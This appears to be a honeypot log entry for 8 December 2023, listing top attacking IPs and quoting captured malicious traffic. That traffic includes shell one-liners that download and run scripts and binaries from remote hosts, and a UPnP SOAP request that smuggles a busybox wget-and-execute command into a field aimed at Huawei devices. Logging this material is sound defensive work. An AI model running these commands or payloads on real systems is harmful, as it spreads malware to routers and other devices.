2023/12/08-12-2023

Top 5 IPs for 2023-12-08:
23.184.48.161
43.156.208.217
167.172.207.18
170.210.225.48
221.161.235.166

Malicious command seen: 
cd /data/local/tmp/; busybox wget http://14.225.211.141/ab.sh; sh ab.sh; curl http://14.225.211.141/ac.sh; sh ac.sh; wget http://14.225.211.141/aw.sh; sh aw.sh
cd /data/local/tmp; busybox wget http://5.181.80.102/armv7l; chmod 777 armv7l; ./armv7l; rm -rf armv7l; busybox wget http://5.181.80.102/bins.sh; sh bins.sh; rm -rf bins.sh

Malicious payload seen:
<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 185.254.37.243 -l /tmp/kh -r /faith.mips; /bin/busybox chmod 777 * /tmp/kh; /tmp/kh huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>




